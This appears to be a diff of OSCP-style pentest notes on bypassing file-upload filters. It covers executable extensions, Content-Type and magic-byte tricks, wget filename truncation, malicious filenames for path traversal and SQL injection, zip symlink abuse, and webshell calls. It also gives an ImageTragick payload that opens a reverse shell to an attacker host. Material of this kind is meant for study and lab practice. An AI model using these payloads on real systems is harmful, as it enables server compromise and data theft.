@@ -1,7 +1,10 @@
+## File Uploads
+
 Only refer Extensions section below for OSCP File upload Bypassing
 
+### Links
 - [Total OSCP Guide File Uploads](https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html)
-## EXTENSIONS
+### EXTENSIONS
 
 - **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
 - **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
@@ -11,7 +14,7 @@ Only refer Extensions section below for OSCP File upload Bypassing
 - **Perl**: _.pl, .cgi_
 - **Erlang Yaws Web Server**: _.yaws_
 
-## Bypass file extensions checks
+### Bypass file extensions checks
 
 1. If they apply, then check the previous extensions. Also test them using some uppercase letters: PHP, .pHP5, .PhAr ...
 
@@ -48,7 +51,7 @@ Only refer Extensions section below for OSCP File upload Bypassing
 
 7. Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “::$data” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”)
 
-## Bypass Content-Type & magic number
+### Bypass Content-Type & magic number
 
 1. Bypass Content-Type checks by setting the value of the Content-Type header to image/png, text/plain, application/octet-stream
 
@@ -59,7 +62,7 @@ Only refer Extensions section below for OSCP File upload Bypassing
 ```
 - It is also possible that the **magic bytes** are just being **checked** in the file and you could set them **anywhere in the file**.
 
-## Other Tricks to check
+### Other Tricks to check
 
 - Find a vulnerability to rename the file already uploaded (to change the extension).
 
@@ -74,7 +77,7 @@ Only refer Extensions section below for OSCP File upload Bypassing
 	- Upload a file in Windows using reserved (forbidden) names such as CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
 - Try also to upload an executable (.exe) or a .html (less suspicious) that will execute code when accidentally opened by the victim.
 
-## wget File Upload/SSRF Trick
+### wget File Upload/SSRF Trick
 
 On some occasions, you may find that a server is using **`wget`** to **download files** and you can **indicate** the **URL**. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, **this check can be bypassed.** The **maximum** length of a **filename** in L**inux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
 
@@ -103,7 +106,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[=============================================
 
 Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then Wget will download the redirected file with the new name. This **won't work** **unless** the wget is being used with the **parameter** `--trust-server-names` because the **wget will download the redirected page with the name of the file indicated in the original URL**.
 
-## From File upload to other vulnerabilities
+### From File upload to other vulnerabilities
 
 - Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
 - Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
@@ -122,16 +125,16 @@ Here’s a top 10 list of things that you can achieve by uploading (from the [li
 8. **PNG / JPEG**: Pixel flood attack (DoS)
 9. **ZIP**: RCE via LFI / DoS
 10. **PDF / PPTX**: SSRF / BLIND XXE
-## Magic Header Bytes
+### Magic Header Bytes
 
 - **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
 - **JPG**: `"\xff\xd8\xff"`
 
-## Zip File Automatically decompressed Upload
+### Zip File Automatically decompressed Upload
 
 If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:
 
-### Symlink
+#### Symlink
 
 Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
 
@@ -140,7 +143,7 @@ ln -s ../../../index.php symindex.txt
 zip --symlinks test.zip symindex.txt
 ```
 
-### Decompress in different folders
+#### Decompress in different folders
 
 The decompressed files will be created in unexpected folders.
 
@@ -219,7 +222,7 @@ Only one step remained: Upload the ZIP file and let the application decompress i
 url/cmd.php?cmd=id
 ```
 
-## ImageTragic
+### ImageTragic
 
 Upload this content with an image extension to exploit the vulnerability **(ImageMagick, 7.0.1-1)**
 
@@ -230,12 +233,12 @@ fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-p
 pop graphic-context
 ```
 
-## Embedding PHP Shell on PNG
+### Embedding PHP Shell on PNG
 
 The primary reason for putting a web shell in the IDAT chunk is that it has the ability to bypass resize and re-sampling operations - PHP-GD contains two functions to do this [imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php) and [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php).
 
 Read this post: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
-## Polyglot Files
+### Polyglot Files
 
 Polyglots, in a security context, are files that are a valid form of multiple different file types. For example, a [GIFAR](https://en.wikipedia.org/wiki/Gifar) is both a GIF and a RAR file. There are also files out there that can be both GIF and JS, both PPT and JS, etc.
 
@@ -245,7 +248,7 @@ This helps to upload a file that complies with the format of several different f
 
 More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
 
-## PHP PowerShell Upload Example
+### PHP PowerShell Upload Example
 
 ```
 Upload the backdoor, then:
